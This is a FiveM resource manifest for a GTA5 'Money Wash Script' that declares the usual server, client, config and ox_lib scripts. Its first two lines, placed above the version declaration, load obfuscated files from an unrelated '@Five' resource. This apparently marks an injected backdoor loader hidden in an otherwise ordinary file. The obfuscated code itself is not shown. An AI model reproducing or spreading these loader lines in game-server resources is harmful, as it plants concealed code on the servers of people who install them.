shared_script '@Five/ai_module_fg-obfuscated.lua'
shared_script '@Five/shared_fg-obfuscated.lua'
fx_version 'cerulean'
game 'gta5'
lua54 'yes'
author 'Bakisito'
description 'Money Wash Script'
version '1.0.4'

server_scripts { 
    "server/*",
}

client_scripts { 
    "client/*",
}

shared_scripts { 'config.lua', '@ox_lib/init.lua'
}

